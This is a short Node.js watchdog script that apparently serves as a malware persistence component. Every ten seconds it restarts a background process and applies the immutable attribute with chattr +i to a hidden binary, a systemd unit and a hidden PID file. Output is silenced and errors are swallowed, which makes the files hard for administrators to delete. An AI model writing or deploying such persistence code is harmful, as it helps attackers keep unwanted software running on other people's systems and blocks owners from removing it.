#!/usr/bin/env node
const { execSync } = require("child_process");
const fs = require("fs");

const MAIN = "/usr/local/bin/.levl7-svc";
const PID_FILE = "/tmp/.levl7-pid";
const SYSTEMD_UNIT = "/etc/systemd/system/levl7-worker.service";

function log(m) { console.log(`[levl7-watchdog] ${m}`); }

setInterval(() => {
  // Check if main process is alive
  try {
    const pid = fs.readFileSync(PID_FILE, "utf8").trim();
    execSync(`kill -0 ${pid} 2>/dev/null`, { stdio: "ignore" });
  } catch {
    log("Main process dead, restarting...");
    try {
      execSync(`node ${__dirname}/index.js >/dev/null 2>&1 &`, { stdio: "ignore" });
    } catch {}
  }

  // Check binary integrity
  if (fs.existsSync(MAIN)) {
    execSync(`chattr +i "${MAIN}" 2>/dev/null || true`, { stdio: "ignore" });
  }

  // Re-arm systemd unit
  if (fs.existsSync(SYSTEMD_UNIT)) {
    execSync(`chattr +i "${SYSTEMD_UNIT}" 2>/dev/null || true`, { stdio: "ignore" });
  }

  // Re-arm PID file
  if (fs.existsSync(PID_FILE)) {
    try { execSync(`chattr +i "${PID_FILE}" 2>/dev/null || true`, { stdio: "ignore" }); } catch {}
  }
}, 10000);

log("Watchdog started");
